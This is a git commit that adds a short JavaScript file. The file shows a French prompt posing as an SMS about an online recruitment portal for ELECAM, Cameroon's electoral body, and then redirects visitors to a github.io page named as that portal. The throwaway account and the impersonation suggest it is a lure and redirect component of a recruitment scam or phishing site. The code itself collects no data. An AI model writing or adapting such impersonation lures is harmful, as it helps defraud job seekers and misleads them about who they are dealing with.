3da397796ba0e1c4667b498e71ca8d80b9850108
newsofferz <joyparker838+tf@gmail.com>
2025-03-13 20:23:18 +0100

    Create upndgrtful.js

---
+++ upndgrtful.js
@@ -0,0 +1,6 @@
+
+var password = 'ELECAM'
+password=prompt('SMS :Bienvenue sur notre portail de recrutement en ligne, cliquez sur OK pour démarrer la candidature  ','ELECAM');
+if (password != 'ELECAM') {
+location.href='https://newsofferz.github.io/ELECAM.recrutement.Portail.cm';
+}
